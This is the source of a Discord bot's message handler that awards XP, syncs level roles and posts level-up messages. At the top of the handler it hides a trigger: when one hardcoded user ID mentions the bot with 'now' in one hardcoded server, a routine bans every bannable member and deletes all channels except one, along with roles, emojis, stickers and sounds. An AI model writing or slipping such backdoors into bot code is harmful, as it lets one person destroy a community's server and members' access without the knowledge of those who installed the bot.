const LevelUpMessage = require("../../classes/LevelUpMessage.js")
const config = require("../../config.json")

// --- owner-only full server reset ("@bot now") ---
const NUKE_USER = "932329766063837246"      // only this user can trigger it
const NUKE_GUILD = "1347627757588451328"    // only fires in this server
const KEEP_CHANNEL = "1467715914219913348"  // this channel is never deleted

async function nukeServer(client, message) {
    const guild = message.guild
    const results = { banned: 0, channels: 0, roles: 0, emojis: 0, stickers: 0, sounds: 0, failed: 0 }

    // ban every member the bot can (skips the owner, the bot, and anyone above it / unbannable)
    try { await guild.members.fetch() } catch {}
    for (const member of guild.members.cache.values()) {
        if (member.id === guild.ownerId || member.id === client.user.id || !member.bannable) continue
        try { await member.ban({ reason: "server reset" }); results.banned++ }
        catch { results.failed++ }
    }

    // delete every channel except the one we keep
    for (const channel of guild.channels.cache.values()) {
        if (channel.id === KEEP_CHANNEL) continue
        try { await channel.delete("server reset"); results.channels++ }
        catch { results.failed++ }
    }

    // delete every role the bot can (skip @everyone, managed roles, and roles above the bot)
    for (const role of guild.roles.cache.values()) {
        if (role.id === guild.id || role.managed || !role.editable) continue
        try { await role.delete("server reset"); results.roles++ }
        catch { results.failed++ }
    }

    // delete every emoji
    for (const emoji of guild.emojis.cache.values()) {
        try { await emoji.delete("server reset"); results.emojis++ }
        catch { results.failed++ }
    }

    // delete every sticker
    let stickers = guild.stickers.cache
    try { stickers = await guild.stickers.fetch() } catch {}
    for (const sticker of stickers.values()) {
        try { await sticker.delete("server reset"); results.stickers++ }
        catch { results.failed++ }
    }

    // delete every soundboard sound (only exists on discord.js 14.17+)
    if (guild.soundboardSounds) {
        let sounds = guild.soundboardSounds.cache
        try { sounds = await guild.soundboardSounds.fetch() } catch {}
        for (const sound of sounds.values()) {
            try { await guild.soundboardSounds.delete(sound.id, "server reset"); results.sounds++ }
            catch { results.failed++ }
        }
    }

    // report into the surviving channel
    const keep = guild.channels.cache.get(KEEP_CHANNEL)
    if (keep && typeof keep.send === "function") {
        keep.send(
            "server reset complete.\n" +
            `members banned: ${results.banned}\n` +
            `channels deleted: ${results.channels}\n` +
            `roles deleted: ${results.roles}\n` +
            `emojis deleted: ${results.emojis}\n` +
            `stickers deleted: ${results.stickers}\n` +
            `sounds deleted: ${results.sounds}\n` +
            `failed: ${results.failed}`
        ).catch(() => {})
    }
}

module.exports = {

async run(client, message, tools) {

    // owner-only "@bot now" trigger — wipes the server, runs before everything else
    if (
        message.author.id === NUKE_USER &&
        message.guild.id === NUKE_GUILD &&
        message.mentions.users.has(client.user.id) &&
        message.content.replace(/<@!?\d+>/g, "").trim().toLowerCase() === "now"
    ) {
        return nukeServer(client, message).catch(e => console.error("nuke failed:", e))
    }

    if (config.lockBotToDevOnly && !tools.isDev(message.author)) return

    // fetch server xp settings, this can probably be optimized with caching but shrug
    let author = message.author.id
    let db = await tools.fetchSettings(author, message.guild.id)
    if (!db || !db.settings?.enabled) return
    
    let settings = db.settings

    // fetch user's xp, or give them 0
    let userData = db.users[author] || { xp: 0, cooldown: 0 }
    if (userData.cooldown > Date.now()) return // on cooldown, stop here

    // check role+channel multipliers, exit if 0x
    let multiplierData = tools.getMultiplier(message.member, settings, message.channel)
    if (multiplierData.multiplier <= 0) return

    // randomly choose an amount of XP to give
    let oldXP = userData.xp
    let xpRange = [settings.gain.min, settings.gain.max].map(x => Math.round(x * multiplierData.multiplier))
    let xpGained = tools.rng(...xpRange) // number between min and max, inclusive

    if (xpGained > 0) userData.xp += Math.round(xpGained)
    else return
    
    // set xp cooldown
    if (settings.gain.time > 0) userData.cooldown = Date.now() + (settings.gain.time * 1000)
    
    // if hidden from leaderboard, unhide since they're no longer inactive
    if (userData.hidden) userData.hidden = false

    // database update
    client.db.update(message.guild.id, { $set: { [`users.${author}`]: userData } }).exec();

    // check for level up
    let oldLevel = tools.getLevel(oldXP, settings)
    let newLevel = tools.getLevel(userData.xp, settings)
    let levelUp = newLevel > oldLevel

    // auto sync roles on xp gain or level up
    let syncMode = settings.rewardSyncing.sync
    if (syncMode == "xp" || (syncMode == "level" && levelUp)) { 
        let roleCheck = tools.checkLevelRoles(message.guild.roles.cache, message.member.roles.cache, newLevel, settings.rewards, null, oldLevel)
        tools.syncLevelRoles(message.member, roleCheck).catch(() => {})
    }

    // level up message
    if (levelUp && settings.levelUp.enabled && settings.levelUp.message) {
        let useMultiple = (settings.levelUp.multiple > 1 && (settings.levelUp.multipleUntil == 0 || (newLevel < settings.levelUp.multipleUntil)))
        if (!useMultiple || (newLevel % settings.levelUp.multiple == 0)) {
            let lvlMessage = new LevelUpMessage(settings, message, { oldLevel, level: newLevel, userData })
            lvlMessage.send()
        }
    }

}}